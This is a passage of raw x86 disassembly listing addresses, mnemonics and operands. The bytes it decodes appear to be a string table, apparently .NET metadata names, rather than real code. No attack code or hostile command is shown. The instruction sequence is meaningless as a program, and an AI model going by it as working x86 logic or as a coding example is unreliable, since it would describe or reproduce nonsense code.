  407660:	arpl   WORD PTR [ebp+0x73],sp
  407663:	jae    0x4076b5
  407665:	popa   
  407666:	jb     0x4076db
  407668:	imul   ebp,DWORD PTR [esi+0x67],0x74786554
  40766f:	add    BYTE PTR [edx+esi*2+0x61],dl
  407673:	arpl   WORD PTR [ebp+0x50],sp
  407676:	jb     0x4076e7
  407678:	arpl   WORD PTR [ebp+0x73],sp
  40767b:	jae    0x4076d1
  40767d:	popa   
  40767e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4e]
  407682:	popa   
  407683:	ins    DWORD PTR es:[edi],dx
  407684:	gs dec eax
  407686:	gs popa 
  407688:	fs gs jb 0x40768c
  40768c:	push   esp
  40768d:	jb     0x4076f0
  40768f:	arpl   WORD PTR [ebp+0x50],sp
  407692:	jb     0x407703
  407694:	arpl   WORD PTR [ebp+0x73],sp
  407697:	jae    0x4076ed
  407699:	popa   
  40769a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x50]
  40769e:	imul   esp,DWORD PTR [eax+ecx*2+0x65],0x72656461
  4076a6:	add    BYTE PTR [edx+esi*2+0x61],dl
  4076aa:	arpl   WORD PTR [ebp+0x50],sp
  4076ad:	jb     0x40771e
  4076af:	arpl   WORD PTR [ebp+0x73],sp
  4076b2:	jae    0x407708
  4076b4:	popa   
  4076b5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x54]
  4076b9:	gs js  0x407730
  4076bc:	add    BYTE PTR [ebp+0x6e],dl
  4076bf:	popa   
  4076c0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x54]
  4076c4:	outs   dx,DWORD PTR ds:[esi]
  4076c5:	inc    ebx
  4076c6:	jb     0x40772d
  4076c8:	popa   
  4076c9:	je     0x407730
  4076cb:	dec    edi
  4076cc:	jne    0x407742
  4076ce:	jo     0x407745
  4076d0:	je     0x407716
  4076d2:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4076d9:	jns    0x4076db
  4076db:	popa   
  4076dc:	jb     0x407745
  4076de:	jae    0x4076e0
  4076e0:	jb     0x407747
  4076e2:	popa   
  4076e3:	fs gs jb 0x4076e7
  4076e7:	gs jb  0x40775c
  4076ea:	outs   dx,DWORD PTR ds:[esi]
  4076eb:	jb     0x40773a
  4076ed:	gs jae 0x407763
  4076f0:	popa   
  4076f1:	add    BYTE PTR gs:[bx+si+0x61],dh
  4076f6:	jb     0x407759
  4076f8:	ins    DWORD PTR es:[edi],dx
  4076f9:	gs je  0x407761
  4076fc:	jb     0x407771
  4076fe:	add    BYTE PTR [ebx+0x74],dh
  407701:	popa   
  407702:	je     0x407779
  407704:	jae    0x407706
  407706:	jb     0x40776d
  407708:	jo     0x407779
  40770a:	jb     0x407780
  40770c:	add    BYTE PTR [eax+0x72],dh
  40770f:	outs   dx,DWORD PTR ds:[esi]
  407710:	addr16 jb 0x407778
  407713:	jae    0x407788
  407715:	add    BYTE PTR [esi+0x61],dh
  407718:	ins    BYTE PTR es:[edi],dx
  407719:	jne    0x407780
  40771b:	add    BYTE PTR [ecx+ebp*2+0x72],ah
  40771f:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  407724:	jns    0x407726
  407726:	popa   
  407727:	jb     0x407790
  407729:	jne    0x407798
  40772b:	outs   dx,BYTE PTR gs:[esi]
  40772d:	je     0x40772f
  40772f:	jb     0x407796
  407731:	jae    0x4077a8
  407733:	ins    BYTE PTR es:[edi],dx
  407734:	je     0x407736
  407736:	push   ebx
  407737:	jns    0x4077ac
  407739:	je     0x4077a0
  40773b:	ins    DWORD PTR es:[edi],dx
  40773c:	cs push edx
  40773e:	jne    0x4077ae
  407740:	je     0x4077ab
  407742:	ins    DWORD PTR es:[edi],dx
  407743:	gs cs dec ecx
  407746:	outs   dx,BYTE PTR ds:[esi]
  407747:	je     0x4077ae
  407749:	jb     0x4077ba
  40774b:	jo     0x4077a0
  40774d:	gs jb  0x4077c6
  407750:	imul   esp,DWORD PTR [ebx+0x65],0x754f0073
  407757:	je     0x40779a
  407759:	je     0x4077cf
  40775b:	jb     0x4077c6
  40775d:	bound  esi,QWORD PTR [ebp+0x74]
  407760:	add    BYTE PTR gs:[eax+0x72],dh
  407764:	outs   dx,DWORD PTR ds:[esi]
  407765:	arpl   WORD PTR [ebp+0x73],sp
  407768:	jae    0x40776a
  40776a:	arpl   WORD PTR [edi+0x6e],bp
  40776d:	imul   sp,WORD PTR [edi+0x0],0x756f
  407773:	je     0x4077b9
  407775:	imul   esi,DWORD PTR [edx+0x0],0x646970
  40777c:	jo     0x4077f0
  40777e:	outs   dx,DWORD PTR ds:[esi]
  40777f:	arpl   WORD PTR [ebp+0x73],sp
  407782:	jae    0x4077d2
  407784:	popa   
  407785:	ins    DWORD PTR es:[edi],dx
  407786:	add    BYTE PTR gs:[ebp+0x73],dh
  40778a:	gs inc ebx
  40778c:	outs   dx,DWORD PTR ds:[esi]
  40778d:	ins    DWORD PTR es:[edi],dx
  40778e:	ins    DWORD PTR es:[edi],dx
  40778f:	popa   
  407790:	outs   dx,BYTE PTR ds:[esi]
  407791:	fs dec esp
  407793:	imul   ebp,DWORD PTR [esi+0x65],0x65646f4d
  40779a:	add    BYTE PTR [ecx+eiz*2+0x72],dh
  40779e:	addr16 gs je 0x4077a2
  4077a2:	push   ebx
  4077a3:	jns    0x407818
  4077a5:	je     0x40780c
  4077a7:	ins    DWORD PTR es:[edi],dx
  4077a8:	cs push edx
  4077aa:	jne    0x40781a
  4077ac:	je     0x407817
  4077ae:	ins    DWORD PTR es:[edi],dx
  4077af:	gs cs push esi
  4077b2:	gs jb  0x407828
  4077b5:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  4077bc:	push   esp
  4077bd:	popa   
  4077be:	jb     0x407827
  4077c0:	gs je  0x407809
  4077c3:	jb     0x407826
  4077c5:	ins    DWORD PTR es:[edi],dx
  4077c6:	gs ja  0x407838
  4077c9:	jb     0x407836
  4077cb:	inc    ecx
  4077cc:	je     0x407842
  4077ce:	jb     0x407839
  4077d0:	bound  esi,QWORD PTR [ebp+0x74]
  4077d3:	add    BYTE PTR gs:[ebx+0x6f],al
  4077d7:	ins    DWORD PTR es:[edi],dx
  4077d8:	push   esi
  4077d9:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  4077e0:	je     0x407856
  4077e2:	jb     0x40784d
  4077e4:	bound  esi,QWORD PTR [ebp+0x74]
  4077e7:	add    BYTE PTR gs:[ebx+0x4c],al
  4077eb:	push   ebx
  4077ec:	inc    ebx
  4077ed:	outs   dx,DWORD PTR ds:[esi]
  4077ee:	ins    DWORD PTR es:[edi],dx
  4077ef:	jo     0x40785d
  4077f1:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4077f8:	jb     0x407863
  4077fa:	bound  esi,QWORD PTR [ebp+0x74]
  4077fd:	add    BYTE PTR gs:[ebx+0x79],dl
  407801:	jae    0x407877
  407803:	gs ins DWORD PTR es:[edi],dx
  407805:	cs push edx
  407807:	gs data16 ins BYTE PTR es:[edi],dx
  40780a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40780f:	outs   dx,BYTE PTR ds:[esi]
  407810:	add    BYTE PTR [ecx+0x73],al
  407813:	jae    0x40787a
  407815:	ins    DWORD PTR es:[edi],dx
  407816:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  40781a:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  407822:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407829:	jae    0x40789e
  40782b:	gs ins DWORD PTR es:[edi],dx
  40782d:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  407831:	gs jae 0x407897
  407834:	jb     0x40789f
  407836:	jo     0x4078ac
  407838:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40783f:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407846:	jae    0x4078bb
  407848:	gs ins DWORD PTR es:[edi],dx
  40784a:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40784e:	gs popaw 
  407851:	jne    0x4078bf
  407853:	je     0x407896
  407855:	ins    BYTE PTR es:[edi],dx
  407856:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40785d:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407864:	jae    0x4078d9
  407866:	gs ins DWORD PTR es:[edi],dx
  407868:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40786c:	outs   dx,DWORD PTR ds:[esi]
  40786d:	ins    DWORD PTR es:[edi],dx
  40786e:	jo     0x4078d1
  407870:	outs   dx,BYTE PTR ds:[esi]
  407871:	jns    0x4078b4
  407873:	je     0x4078e9
  407875:	jb     0x4078e0
  407877:	bound  esi,QWORD PTR [ebp+0x74]
  40787a:	add    BYTE PTR gs:[ecx+0x73],al
  40787e:	jae    0x4078e5
  407880:	ins    DWORD PTR es:[edi],dx
  407881:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  407885:	jb     0x4078f6
  407887:	fs jne 0x4078ed
  40788a:	je     0x4078cd
  40788c:	je     0x407902
  40788e:	jb     0x4078f9
  407890:	bound  esi,QWORD PTR [ebp+0x74]
  407893:	add    BYTE PTR gs:[ecx+0x73],al
  407897:	jae    0x4078fe
  407899:	ins    DWORD PTR es:[edi],dx
  40789a:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40789e:	outs   dx,DWORD PTR ds:[esi]
  40789f:	jo     0x40791a
  4078a1:	jb     0x40790c
  4078a3:	addr16 push 0x74744174
  4078a9:	jb     0x407914
  4078ab:	bound  esi,QWORD PTR [ebp+0x74]
  4078ae:	add    BYTE PTR gs:[ecx+0x73],al
  4078b2:	jae    0x407919
  4078b4:	ins    DWORD PTR es:[edi],dx
  4078b5:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  4078b9:	gs jb  0x40792f
  4078bc:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4078c3:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4078ca:	jae    0x40793f
  4078cc:	gs ins DWORD PTR es:[edi],dx
  4078ce:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4078d2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4078da:	outs   dx,DWORD PTR ds:[esi]
  4078db:	outs   dx,BYTE PTR ds:[esi]
  4078dc:	inc    ecx
  4078dd:	je     0x407953
  4078df:	jb     0x40794a
  4078e1:	bound  esi,QWORD PTR [ebp+0x74]
  4078e4:	add    BYTE PTR gs:[ecx+0x73],al
  4078e8:	jae    0x40794f
  4078ea:	ins    DWORD PTR es:[edi],dx
  4078eb:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4078ef:	outs   dx,BYTE PTR ds:[esi]
  4078f0:	outs   dx,WORD PTR ds:[esi]
  4078f2:	jb     0x407961
  4078f4:	popa   
  4078f5:	je     0x407960
  4078f7:	outs   dx,DWORD PTR ds:[esi]
  4078f8:	outs   dx,BYTE PTR ds:[esi]
  4078f9:	popa   
  4078fa:	ins    BYTE PTR es:[edi],dx
  4078fb:	push   esi
  4078fc:	gs jb  0x407972
  4078ff:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407906:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  40790d:	popa   
  40790e:	je     0x407975
  407910:	ins    BYTE PTR es:[edi],dx
  407911:	ins    BYTE PTR es:[edi],dx
  407912:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  40791a:	popa   
  40791b:	arpl   WORD PTR [esi+edx*2+0x65],si
  40791f:	jb     0x407994
  407921:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407928:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  40792f:	gs jne 0x4079a6
  407932:	jb     0x407995
  407934:	ins    BYTE PTR es:[edi],dx
  407935:	push   edx
  407936:	gs jae 0x4079a8
  407939:	jne    0x4079ad
  40793b:	arpl   WORD PTR [ebp+0x73],sp
  40793e:	dec    esp
  40793f:	popa   
  407940:	outs   dx,BYTE PTR ds:[esi]
  407941:	addr16 jne 0x4079a5
  407944:	addr16 gs inc ecx
  407947:	je     0x4079bd
  407949:	jb     0x4079b4
  40794b:	bound  esi,QWORD PTR [ebp+0x74]
  40794e:	add    BYTE PTR gs:[ebp+0x6c],dl
  407952:	je     0x4079bd
  407954:	ins    DWORD PTR es:[edi],dx
  407955:	popa   
  407956:	je     0x4079bd
  407958:	push   edx
  407959:	gs jae 0x4079cb
  40795c:	jne    0x4079d0
  40795e:	arpl   WORD PTR [ebp+0x46],sp
  407961:	popa   
  407962:	ins    BYTE PTR es:[edi],dx
  407963:	ins    BYTE PTR es:[edi],dx
  407964:	bound  esp,QWORD PTR [ecx+0x63]
  407967:	imul   ecx,DWORD PTR [edi+ebp*2+0x63],0x61
  40796c:	je     0x4079d7
  40796e:	outs   dx,DWORD PTR ds:[esi]
  40796f:	outs   dx,BYTE PTR ds:[esi]
  407970:	add    BYTE PTR [ecx+0x73],al
  407973:	jae    0x4079da
  407975:	ins    DWORD PTR es:[edi],dx
  407976:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40797a:	gs ins BYTE PTR es:[edi],dx
  40797c:	popa   
  40797d:	jns    0x4079d2
  40797f:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  407986:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40798d:	jae    0x407a02
  40798f:	gs ins DWORD PTR es:[edi],dx
  407991:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  407995:	gs jns 0x4079de
  407998:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4079a0:	bound  esi,QWORD PTR [ebp+0x74]
  4079a3:	add    BYTE PTR gs:[ecx+0x73],al
  4079a7:	jae    0x407a0e
  4079a9:	ins    DWORD PTR es:[edi],dx
  4079aa:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  4079ae:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  4079b5:	gs dec ebx
  4079b7:	gs jns 0x4079fb
  4079ba:	je     0x407a30
  4079bc:	jb     0x407a27
  4079be:	bound  esi,QWORD PTR [ebp+0x74]
  4079c1:	add    BYTE PTR gs:[ebx+0x79],dl
  4079c5:	jae    0x407a3b
  4079c7:	gs ins DWORD PTR es:[edi],dx
  4079c9:	cs push edx
  4079cb:	jne    0x407a3b
  4079cd:	je     0x407a38
  4079cf:	ins    DWORD PTR es:[edi],dx
  4079d0:	gs cs inc ebx
  4079d3:	outs   dx,DWORD PTR ds:[esi]
  4079d4:	ins    DWORD PTR es:[edi],dx
  4079d5:	jo     0x407a40
  4079d7:	ins    BYTE PTR es:[edi],dx
  4079d8:	gs jb  0x407a2e
  4079db:	gs jb  0x407a54
  4079de:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  4079e5:	outs   dx,BYTE PTR ds:[esi]
  4079e6:	je     0x407a51
  4079e8:	ins    DWORD PTR es:[edi],dx
  4079e9:	gs inc ebx
  4079eb:	outs   dx,DWORD PTR ds:[esi]
  4079ec:	ins    DWORD PTR es:[edi],dx
  4079ed:	jo     0x407a50
  4079ef:	je     0x407a5a
  4079f1:	bound  ebp,QWORD PTR [ecx+0x6c]
  4079f4:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4079fc:	bound  esi,QWORD PTR [ebp+0x74]
  4079ff:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  407a04:	jne    0x407a6d
  407a06:	addr16 popa 
  407a08:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  407a0c:	je     0x407a82
  407a0e:	jb     0x407a79
  407a10:	bound  esi,QWORD PTR [ebp+0x74]
  407a13:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  407a18:	jne    0x407a81
  407a1a:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  407a22:	jae    0x407a24
  407a24:	inc    ebx
  407a25:	outs   dx,DWORD PTR ds:[esi]
  407a26:	ins    DWORD PTR es:[edi],dx
  407a27:	jo     0x407a92
  407a29:	ins    BYTE PTR es:[edi],dx
  407a2a:	popa   
  407a2b:	je     0x407a96
  407a2d:	outs   dx,DWORD PTR ds:[esi]
  407a2e:	outs   dx,BYTE PTR ds:[esi]
  407a2f:	push   edx
  407a30:	gs ins BYTE PTR es:[edi],dx
  407a32:	popa   
  407a33:	js     0x407a96
  407a35:	je     0x407aa0
  407a37:	outs   dx,DWORD PTR ds:[esi]
  407a38:	outs   dx,BYTE PTR ds:[esi]
  407a39:	jae    0x407a7c
  407a3b:	je     0x407ab1
  407a3d:	jb     0x407aa8
  407a3f:	bound  esi,QWORD PTR [ebp+0x74]
  407a42:	add    BYTE PTR gs:[ebx+0x76],al
  407a46:	inc    ebx
  407a47:	outs   dx,DWORD PTR ds:[esi]
  407a48:	ins    BYTE PTR es:[edi],dx
  407a49:	ins    BYTE PTR es:[edi],dx
  407a4a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407a4f:	outs   dx,BYTE PTR ds:[esi]
  407a50:	inc    ebx
  407a51:	ins    DWORD PTR es:[edi],dx
  407a52:	add    BYTE PTR fs:[ebx+0x6f],al
  407a56:	outs   dx,BYTE PTR ds:[esi]
  407a57:	jae    0x407ac8
  407a59:	ins    BYTE PTR es:[edi],dx
  407a5a:	add    BYTE PTR gs:[edi+0x72],dl
  407a5e:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  407a66:	inc    ebx
  407a67:	push   esi
  407a68:	inc    ebx
  407a69:	outs   dx,DWORD PTR ds:[esi]
  407a6a:	ins    BYTE PTR es:[edi],dx
  407a6b:	ins    BYTE PTR es:[edi],dx
  407a6c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407a71:	outs   dx,BYTE PTR ds:[esi]
  407a72:	inc    ebp
  407a73:	js     0x407ad8
  407a75:	gs jo  0x407aec
  407a78:	imul   ebp,DWORD PTR [edi+0x6e],0x6c6f4300
  407a7f:	ins    BYTE PTR es:[edi],dx
  407a80:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407a85:	outs   dx,BYTE PTR ds:[esi]
  407a86:	inc    ebp
  407a87:	jb     0x407afb
  407a89:	outs   dx,DWORD PTR ds:[esi]
  407a8a:	jb     0x407a8c
  407a8c:	addr16 gs je 0x407aef
  407a90:	inc    ebp
  407a91:	jb     0x407b05
  407a93:	outs   dx,DWORD PTR ds:[esi]
  407a94:	jb     0x407ad9
  407a96:	outs   dx,DWORD PTR ds:[esi]
  407a97:	fs add BYTE PTR gs:[edi+0x65],al
  407a9c:	je     0x407ae4
  407a9e:	jb     0x407b09
  407aa0:	outs   dx,BYTE PTR gs:[esi]
  407aa2:	fs ins BYTE PTR es:[edi],dx
  407aa4:	jns    0x407aeb
  407aa6:	jb     0x407b1a
  407aa8:	outs   dx,DWORD PTR ds:[esi]
  407aa9:	jb     0x407af8
  407aab:	gs jae 0x407b21
  407aae:	popa   
  407aaf:	add    BYTE PTR gs:[bp+di+0x74],dl
  407ab4:	jb     0x407b1f
  407ab6:	outs   dx,BYTE PTR ds:[esi]
  407ab7:	add    BYTE PTR [bp+di+0x6f],al
  407abb:	outs   dx,BYTE PTR ds:[esi]
  407abc:	arpl   WORD PTR [ecx+0x74],sp
  407abf:	add    BYTE PTR [ebx+0x75],dl
  407ac2:	jo     0x407b34
  407ac4:	outs   dx,DWORD PTR ds:[esi]
  407ac5:	jb     0x407b3b
  407ac7:	add    BYTE PTR [ebp+0x78],al
  407aca:	arpl   WORD PTR [ebp+0x70],sp
  407acd:	je     0x407b38
  407acf:	outs   dx,DWORD PTR ds:[esi]
  407ad0:	outs   dx,BYTE PTR ds:[esi]
  407ad1:	add    BYTE PTR [edx+esi*2+0x61],dl
  407ad5:	arpl   WORD PTR [ebp+0x45],sp
  407ad8:	js     0x407b3d
  407ada:	gs jo  0x407b51
  407add:	imul   ebp,DWORD PTR [edi+0x6e],0x63617453
  407ae4:	imul   eax,DWORD PTR [eax],0x45
  407ae7:	ins    DWORD PTR es:[edi],dx
  407ae8:	jo     0x407b5e
  407aea:	jns    0x407aec
  407aec:	push   eax
  407aed:	popa   
  407aee:	jb     0x407b63
  407af0:	gs inc ebp
  407af2:	js     0x407b57
  407af4:	gs jo  0x407b6b
  407af7:	imul   ebp,DWORD PTR [edi+0x6e],0x72615000
  407afe:	jae    0x407b65
  407b00:	inc    ebp
  407b01:	js     0x407b66
  407b03:	gs jo  0x407b7a
  407b06:	imul   ebp,DWORD PTR [edi+0x6e],0x73616552
  407b0d:	outs   dx,DWORD PTR ds:[esi]
  407b0e:	outs   dx,BYTE PTR ds:[esi]
  407b0f:	add    BYTE PTR [edi+0x65],ah
  407b12:	je     0x407b73
  407b14:	inc    ebp
  407b15:	js     0x407b7a
  407b17:	gs jo  0x407b8e
  407b1a:	imul   ebp,DWORD PTR [edi+0x6e],0x73616552
  407b21:	outs   dx,DWORD PTR ds:[esi]
  407b22:	outs   dx,BYTE PTR ds:[esi]
  407b23:	add    BYTE PTR [edx+0x65],dl
  407b26:	jae    0x407b97
  407b28:	jne    0x407b9c
  407b2a:	arpl   WORD PTR [ebp+0x73],sp
  407b2d:	add    BYTE PTR [edi+0x65],ah
  407b30:	je     0x407b91
  407b32:	push   eax
  407b33:	popa   
  407b34:	jb     0x407ba9
  407b36:	imul   ebp,DWORD PTR [esi+0x67],0x74736f4c
  407b3d:	dec    ebx
  407b3e:	gs jb  0x407baf
  407b41:	gs ins BYTE PTR es:[edi],dx
  407b43:	inc    ebp
  407b44:	jbe    0x407bab
  407b46:	outs   dx,BYTE PTR ds:[esi]
  407b47:	je     0x407bbc
  407b49:	add    BYTE PTR [edi+0x65],ah
  407b4c:	je     0x407bad
  407b4e:	push   eax
  407b4f:	popa   
  407b50:	jb     0x407bc5
  407b52:	imul   ebp,DWORD PTR [esi+0x67],0x6e6b6e55
  407b59:	outs   dx,DWORD PTR ds:[esi]
  407b5a:	ja     0x407bca
  407b5c:	push   esp
  407b5d:	imul   ebp,DWORD PTR [ebp+0x65],0x6d617473
  407b64:	jo     0x407bbb
  407b66:	outs   dx,BYTE PTR ds:[esi]
  407b67:	imul   esi,DWORD PTR [eax+eax*1+0x67],0x505f7465
  407b6f:	popa   
  407b70:	jb     0x407be5
  407b72:	imul   ebp,DWORD PTR [esi+0x67],0x72726f43
  407b79:	jne    0x407beb
  407b7b:	je     0x407bd1
  407b7d:	jb     0x407be0
  407b7f:	arpl   WORD PTR [ebp+0x0],sp
  407b82:	addr16 gs je 0x407be5
  407b86:	push   eax
  407b87:	popa   
  407b88:	jb     0x407bfd
  407b8a:	imul   ebp,DWORD PTR [esi+0x67],0x67726154
  407b91:	gs je  0x407be4
  407b94:	imul   esp,DWORD PTR [edx+edx*2+0x65],0x6c637963
  407b9c:	gs add BYTE PTR fs:[edi+0x65],ah
  407ba1:	je     0x407c02
  407ba3:	dec    edi
  407ba4:	jo     0x407c0b
  407ba6:	outs   dx,BYTE PTR ds:[esi]
  407ba7:	push   edx
  407ba8:	gs jo  0x407c1a
  407bab:	jb     0x407c21
  407bad:	inc    esi
  407bae:	popa   
  407baf:	imul   ebp,DWORD PTR [ebp+edx*2+0x6e],0x776f6e6b
  407bb7:	outs   dx,BYTE PTR ds:[esi]
  407bb8:	add    BYTE PTR [edi+0x65],ah
  407bbb:	je     0x407c1c
  407bbd:	dec    ebp
  407bbe:	gs jae 0x407c34
  407bc1:	popa   
  407bc2:	add    BYTE PTR gs:[si+0x79],dl
  407bc7:	jo     0x407c2e
  407bc9:	add    BYTE PTR [edi+0x65],al
  407bcc:	je     0x407c22
  407bce:	jns    0x407c40
  407bd0:	add    BYTE PTR gs:[edi+ebp*2+0x53],dl
  407bd5:	je     0x407c49
  407bd7:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  407bde:	pop    edi
  407bdf:	push   ebx
  407be0:	je     0x407c43
  407be2:	arpl   WORD PTR [ebx+0x54],bp
  407be5:	jb     0x407c48
  407be7:	arpl   WORD PTR [ebp+0x0],sp
  407bea:	inc    ecx
  407beb:	jae    0x407c60
  407bed:	gs ins DWORD PTR es:[edi],dx
  407bef:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407bf3:	inc    edi
  407bf4:	gs je  0x407c3c
  407bf7:	js     0x407c5e
  407bf9:	arpl   WORD PTR [ebp+0x74],si
  407bfc:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  407c03:	ins    DWORD PTR es:[edi],dx
  407c04:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407c08:	addr16 gs je 0x407c6b
  407c0c:	push   edi
  407c0d:	imul   ebp,DWORD PTR [esi+0x64],0x6957776f
  407c14:	fs je  0x407c7f
  407c17:	add    BYTE PTR [ebp+0x6f],cl
  407c1a:	fs jne 0x407c89
  407c1d:	add    BYTE PTR gs:[edi+0x65],ah
  407c21:	je     0x407c82
  407c23:	dec    ebp
  407c24:	popa   
  407c25:	outs   dx,BYTE PTR ds:[esi]
  407c26:	imul   esp,DWORD PTR [esi+0x65],0x6f4d7473
  407c2d:	fs jne 0x407c9c
  407c30:	add    BYTE PTR gs:[eax+0x65],cl
  407c34:	ins    BYTE PTR es:[edi],dx
  407c35:	jo     0x407c8a
  407c37:	je     0x407cab
  407c39:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  407c40:	je     0x407ca7
  407c42:	ins    DWORD PTR es:[edi],dx
  407c43:	cs dec ecx
  407c45:	dec    edi
  407c46:	add    BYTE PTR [ecx+0x4f],cl
  407c49:	inc    ebp
  407c4a:	js     0x407caf
  407c4c:	gs jo  0x407cc3
  407c4f:	imul   ebp,DWORD PTR [edi+0x6e],0x73734100
  407c56:	gs jb  0x407ccd
  407c59:	add    BYTE PTR [eax+0x61],cl
  407c5c:	jae    0x407ca4
  407c5e:	ins    BYTE PTR es:[edi],dx
  407c5f:	popa   
  407c60:	add    BYTE PTR [bx+0x65],al
  407c64:	je     0x407cb3
  407c66:	imul   esi,DWORD PTR [ebx+0x73],0x614d6465
  407c6d:	outs   dx,BYTE PTR ds:[esi]
  407c6e:	fs popa 
  407c70:	je     0x407ce1
  407c72:	jb     0x407ced
  407c74:	push   eax
  407c75:	popa   
  407c76:	jb     0x407cd9
  407c78:	ins    DWORD PTR es:[edi],dx
  407c79:	gs je  0x407ce1
  407c7c:	jb     0x407cf1
  407c7e:	add    BYTE PTR [edi+0x65],al
  407c81:	je     0x407cd3
  407c83:	popa   
  407c84:	jb     0x407cf9
  407c86:	gs inc esi
  407c88:	popa   
  407c89:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x47007365
  407c91:	gs je  0x407cd8
  407c94:	jne    0x407d06
  407c96:	ins    BYTE PTR es:[edi],dx
  407c97:	imul   esp,DWORD PTR [ebx+0x61],0x50646574
  407c9e:	popa   
  407c9f:	jb     0x407d02
  407ca1:	ins    DWORD PTR es:[edi],dx
  407ca2:	gs je  0x407d0a
  407ca5:	jb     0x407d1a
  407ca7:	add    BYTE PTR [ebx+0x79],dl
  407caa:	jae    0x407d20
  407cac:	gs ins DWORD PTR es:[edi],dx
  407cae:	cs push esp
  407cb0:	gs js  0x407d27
  407cb3:	add    BYTE PTR [ebx+0x74],dl
  407cb6:	jb     0x407d21
  407cb8:	outs   dx,BYTE PTR ds:[esi]
  407cb9:	addr16 inc edx
  407cbb:	jne    0x407d26
  407cbd:	ins    BYTE PTR es:[edi],dx
  407cbe:	fs gs jb 0x407cc2
  407cc2:	inc    ecx
  407cc3:	jo     0x407d35
  407cc5:	outs   dx,BYTE PTR gs:[esi]
  407cc7:	fs inc esi
  407cc9:	outs   dx,DWORD PTR ds:[esi]
  407cca:	jb     0x407d39
  407ccc:	popa   
  407ccd:	je     0x407ccf
  407ccf:	push   ebx
  407cd0:	jns    0x407d45
  407cd2:	je     0x407d39
  407cd4:	ins    DWORD PTR es:[edi],dx
  407cd5:	cs inc ebx
  407cd7:	outs   dx,DWORD PTR ds:[esi]
  407cd8:	jb     0x407d3f
  407cda:	add    BYTE PTR [ebx+0x79],dl
  407cdd:	jae    0x407d53
  407cdf:	gs ins DWORD PTR es:[edi],dx
  407ce1:	cs dec esp
  407ce3:	imul   ebp,DWORD PTR [esi+0x71],0x756e4500
  407cea:	ins    DWORD PTR es:[edi],dx
  407ceb:	gs jb  0x407d4f
  407cee:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  407cf2:	push   esp
  407cf3:	outs   dx,DWORD PTR ds:[esi]
  407cf4:	inc    ecx
  407cf5:	jb     0x407d69
  407cf7:	popa   
  407cf8:	jns    0x407cfa
  407cfa:	inc    ecx
  407cfb:	jo     0x407d6d
  407cfd:	outs   dx,BYTE PTR gs:[esi]
  407cff:	add    BYTE PTR fs:[ecx+0x70],al
  407d03:	jo     0x407d6a
  407d05:	outs   dx,BYTE PTR ds:[esi]
  407d06:	fs dec esp
  407d08:	imul   ebp,DWORD PTR [esi+0x65],0x74656700
  407d0f:	pop    edi
  407d10:	inc    ebx
  407d11:	jne    0x407d85
  407d13:	jb     0x407d7a
  407d15:	outs   dx,BYTE PTR ds:[esi]
  407d16:	je     0x407d5b
  407d18:	jne    0x407d86
  407d1a:	je     0x407d91
  407d1c:	jb     0x407d83
  407d1e:	add    BYTE PTR [edi+0x65],ah
  407d21:	je     0x407d82
  407d23:	dec    esp
  407d24:	outs   dx,DWORD PTR ds:[esi]
  407d25:	arpl   WORD PTR [ecx+0x74],sp
  407d28:	imul   ebp,DWORD PTR [edi+0x6e],0x6c694600
  407d2f:	gs push esi
  407d31:	gs jb  0x407da7
  407d34:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  407d3b:	add    BYTE PTR [edi+0x65],al
  407d3e:	je     0x407d96
